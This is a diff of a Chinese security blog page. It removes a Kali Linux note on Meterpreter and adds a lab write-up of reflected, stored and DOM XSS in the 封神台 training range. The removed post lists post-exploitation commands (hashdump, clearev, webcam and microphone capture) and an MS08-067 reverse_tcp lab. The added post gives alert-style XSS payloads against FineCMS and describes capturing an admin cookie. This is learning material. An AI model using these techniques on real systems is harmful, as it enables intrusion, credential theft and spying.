@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="安全," />
+  <meta name="keywords" content="XSS," />
 
 
 
@@ -79,16 +79,32 @@
 
 
 
-<meta name="description" content="1. Meterpreter 高级、动态、可扩展的Payload（同Nanocode同样的多功能payload） 基于meterpreter上下文利用更多漏洞发起攻击 后渗透测试阶段一站式操作界面   完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果） 注入合法系统进程并建立stager 基于stager上传和预加载DLL进行扩展模块的注入（客户端API） 基于stager建立">
-<meta name="keywords" content="安全">
+<meta name="description" content="1. 反射型XSS 先是尝试输入特征字符&amp;#39;&amp;quot;&amp;lt;&amp;gt;666,按F12查看转义或者过滤情况 发现&amp;#39;没有转义，其他都有被转义 进行利用，构造payload：9&amp;#39; onclick=&amp;#39;alert(&#x2F;xss&#x2F;) 搜索并点击输入框，弹出flag   2. 存储型XSS 进入CMS，对着各种框框就是一顿操作 插入各种代码’”&amp;lt;&amp;gt;666，alert(">
+<meta name="keywords" content="XSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(一百)：Meterpreter Shell">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;26&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell&#x2F;index.html">
+<meta property="og:title" content="XSS靶场--封神台">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;30&#x2F;XSS%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. Meterpreter 高级、动态、可扩展的Payload（同Nanocode同样的多功能payload） 基于meterpreter上下文利用更多漏洞发起攻击 后渗透测试阶段一站式操作界面   完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果） 注入合法系统进程并建立stager 基于stager上传和预加载DLL进行扩展模块的注入（客户端API） 基于stager建立">
+<meta property="og:description" content="1. 反射型XSS 先是尝试输入特征字符&amp;#39;&amp;quot;&amp;lt;&amp;gt;666,按F12查看转义或者过滤情况 发现&amp;#39;没有转义，其他都有被转义 进行利用，构造payload：9&amp;#39; onclick=&amp;#39;alert(&#x2F;xss&#x2F;) 搜索并点击输入框，弹出flag   2. 存储型XSS 进入CMS，对着各种框框就是一顿操作 插入各种代码’”&amp;lt;&amp;gt;666，alert(">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-02-26T08:30:22.750Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;reflect-flag.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;name-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;link-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;c&amp;id-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;c&amp;m-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;cookie-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;source-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;burp-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;insert-store.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;safe-dog.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;dom-name.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;dom-txt.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;dom-script2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;dom-script1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;dom-cookie.png">
+<meta property="og:updated_time" content="2020-03-30T14:55:00.052Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xss&#x2F;%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;reflect-flag.png">
 
 
 
@@ -118,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/26/Kali Linux笔记(一百)：Meterpreter Shell/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/30/XSS靶场--封神台/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(一百)：Meterpreter Shell | Tomas'Blog</title>
+  <title>XSS靶场--封神台 | Tomas'Blog</title>
   
 
 
@@ -243,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(一百)：Meterpreter Shell</h1>
+          <h1 class="post-title" itemprop="name headline">XSS靶场--封神台</h1>
         
 
         <div class="post-meta">
@@ -272,8 +288,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
-                2020-02-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-30T22:57:48+08:00">
+                2020-03-30
               </time>
             
 
@@ -295,8 +311,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
                   </a>
                 </span>
 
@@ -326,7 +342,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  960 字
+                  862 字
                 </span>
               
 
@@ -364,122 +380,101 @@
 
       
         <hr>
-<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
-<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
-<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
-<li>后渗透测试阶段一站式操作界面</li>
+<h4 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h4><ul>
+<li>先是尝试输入特征字符<code>&#39;&quot;&lt;&gt;666</code>,按F12查看转义或者过滤情况</li>
+<li>发现<code>&#39;</code>没有转义，其他都有被转义</li>
+<li>进行利用，构造payload：<code>9&#39; onclick=&#39;alert(/xss/)</code></li>
+<li>搜索并点击输入框，弹出flag</li>
 </ul>
-</li>
-<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
-<li>注入合法系统进程并建立stager</li>
-<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
-<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
-<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/reflect-flag.png" alt="reflect-flag"></p>
+<h4 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h4><ul>
+<li>进入CMS，对着各种框框就是一顿操作</li>
+<li>插入各种代码’”&lt;&gt;666，<script>alert(1)</script>等</li>
+<li>▲ 然并软，没啥用</li>
+<li>返回查看题目，CMS通杀？赶紧百度一下</li>
 </ul>
-</li>
-<li>服务端使用C语言编写</li>
-<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/name-store.png" alt="name-store"></p>
+<ul>
+<li>信息收集一波后，发现是FineCMS v5.3.0有两个XSS漏洞，查找到资料如下</li>
 </ul>
-<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
-<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
-<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
-<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
-<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
-<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
-<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
-<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
-<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
-<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
-<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
-<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
-<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
-<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
-<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
-<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
-<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
-<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
-<li>-f：执行的程序</li>
-<li>-i：进行交互性shell</li>
-<li>-H：程序进行隐藏</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
-<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
-<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
-<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
-<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
-<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
-<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
-<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
-<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
-<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
-<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
-<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
-<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
-<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
-<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
-<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
-<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
-<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
-<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
-<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
-<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/link-store.png" alt="link-store"></p>
+<ul>
+<li>依猫画葫芦的，插入字段<code>c=text&amp;m=&lt;script&gt;alert(1)&lt;/script&gt;</code><ul>
+<li>发现可以弹窗，这可以进行利用了</li>
+<li>▲ 除了c和m，其他字段的提交好像都无法构成闭合</li>
 </ul>
 </li>
 </ul>
-<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
-<li>2015年11月份，来自社区的贡献</li>
-<li>▲ 无需运行环境，在客户端运行原生python代码</li>
-<li><strong><code>🔺命令：load python</code></strong><ul>
-<li><strong><code>🔺命令：Help</code></strong></li>
-<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
-<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
-<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/c&id-store.png" alt="c&amp;id-store"></p>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/c&m-store.png" alt="c&amp;m-store"></p>
+<ul>
+<li>构造payload，在xss平台构造payload，进行代码注入，静态boot的Cookie<ul>
+<li>▲ 此处无任何过滤…</li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
-<li>Kali主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/cookie-store.png" alt="cookie-store"></p>
+<ul>
+<li>在查找资料的过程中，找到两份资料，讲述了第二个存储型漏洞</li>
+<li>(xeel的文章)[<a href="https://bbs.zkaq.cn/t/3016.html]" target="_blank" rel="noopener">https://bbs.zkaq.cn/t/3016.html]</a></li>
+<li>(FreeBuf上大佬的分析)[<a href="https://www.freebuf.com/column/165269.html]" target="_blank" rel="noopener">https://www.freebuf.com/column/165269.html]</a></li>
+<li>对第二个存储型漏洞进行检测</li>
+<li>对留言板进行代码注入，查看源代码发现被转义</li>
 </ul>
-</li>
-<li>Window XP SP3主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/source-store.png" alt="source-store"></p>
+<ul>
+<li>在放弃之余，尝试了xeel老哥的抓包操作，发现可以</li>
+<li>注入xss平台的代码就不写了，能弹窗就能进行插入xss平台的代码</li>
 </ul>
-</li>
-<li>Kali主机<ul>
-<li><strong><code>🔺命令：msconsole</code></strong><ul>
-<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
-<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
-<li><strong><code>🔺命令：set target 34</code></strong></li>
-<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
-<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：show options</code></strong></li>
-<li><strong><code>🔺命令：exploit -j</code></strong></li>
-<li><strong><code>🔺命令：sessions -l</code></strong></li>
-<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
-<li><strong><code>🔺命令：meterpreter</code></strong></li>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/burp-store.png" alt="burp-store"></p>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/insert-store.png" alt="insert-store"></p>
+<ul>
+<li>疑问<ul>
+<li>为什么抓包修改可以，难道这里对特殊字符的转义是在客户端?</li>
 </ul>
 </li>
 </ul>
-</li>
+<h4 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h4><ul>
+<li>进入DOM XSS的页面，这里有点小插曲，如下，安全狗<ul>
+<li>▲ 这里有点神奇的是，我用chrome去访问，会有安全狗，但用Firefox去访问，是没有问题的，刚开始怀疑是User-agent的原因，后面去换了User-agent，没有问题，这里因为安全狗卡了好久，后面才知道原来掌握安全的课堂上有讲</li>
 </ul>
 </li>
+</ul>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/safe-dog.png" alt="safe-dog"></p>
+<ul>
+<li>对DOM XSS的画面</li>
+<li>各自输入框进行插入尝试，<code>&#39;&quot;&lt;&gt;666,&lt;script&gt;alert(1)&lt;/script&gt;等</code></li>
+<li>审查元素和源代码都没有问题</li>
+<li>返回去查看题目</li>
+</ul>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-name.png" alt="dom-name"></p>
+<ul>
+<li>审查dom.txt</li>
+<li>发现有对输入的内容的过滤（过滤真的多！！）</li>
+<li>发现url，机缘巧合之下发现自己好像没有审计url</li>
+<li>正则匹配写入文件，这个可以后期利用（通过iframe）</li>
+</ul>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-txt.png" alt="dom-txt"></p>
+<ul>
+<li>审查url</li>
+<li>往url插入<code>&#39;&quot;&lt;&gt;666,&lt;script&gt;alert(1)&lt;/script&gt;</code>等，但无法成功</li>
+<li>百般无奈往社区一查 -&gt; 原来需要Unicode编码以及”?”号，到目前还是不是很清楚，这两个是如何看出来的，难道就是因为多次试错，Unicode编码我可以理解，但”?”这个就难以描述<ul>
+<li>后面解答：问号在URL栏里面是什么？你记不记得POST和GET传参的区别。GET传参会显示在URL栏里面，那么浏览器怎么区分这个是GET传参还是网址？就是通过问号，问号后的一切都是GET传参</li>
+</ul>
+</li>
+<li>插入代码，进行弹窗</li>
+</ul>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-script2.png" alt="dom-script2"></p>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-script1.png" alt="dom-script1"></p>
+<ul>
+<li>构造payload，通过xss平台构造，然后通过Unicode编码，成功截取到管理员的Cookie</li>
+</ul>
+<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-cookie.png" alt="dom-cookie"></p>
+<ul>
+<li>▲ 2020.03.28 颜色输入框后面”#000000”也存在XSS漏洞，暂未实验</li>
+</ul>
+<h4 id="4-靶场说明"><a href="#4-靶场说明" class="headerlink" title="4. 靶场说明"></a>4. 靶场说明</h4><ul>
+<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
 </ul>
 
       
@@ -498,7 +493,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
           
         </div>
       
@@ -511,8 +506,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/" rel="next" title="Kali Linux笔记(九十九)：MSF--msfcli控制台命令">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十九)：MSF--msfcli控制台命令
+              <a href="/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--xss-labs/" rel="next" title="XSS靶场--xss-labs">
+                <i class="fa fa-chevron-left"></i> XSS靶场--xss-labs
               </a>
             
           </div>
@@ -520,10 +515,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/" rel="prev" title="Kali Linux笔记(一百零一)：MSF模块--Exploit">
-                Kali Linux笔记(一百零一)：MSF模块--Exploit <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -693,7 +684,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Meterpreter"><span class="nav-number">1.</span> <span class="nav-text">1. Meterpreter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Meterpreter基本命令"><span class="nav-number">2.</span> <span class="nav-text">2. Meterpreter基本命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Meterpreter-Python扩展"><span class="nav-number">3.</span> <span class="nav-text">3. Meterpreter Python扩展</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-实验"><span class="nav-number">4.</span> <span class="nav-text">4. 实验</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-反射型XSS"><span class="nav-number">1.</span> <span class="nav-text">1. 反射型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-存储型XSS"><span class="nav-number">2.</span> <span class="nav-text">2. 存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-DOM型XSS"><span class="nav-number">3.</span> <span class="nav-text">3. DOM型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-靶场说明"><span class="nav-number">4.</span> <span class="nav-text">4. 靶场说明</span></a></li></ol></div>
             
 
           </div>
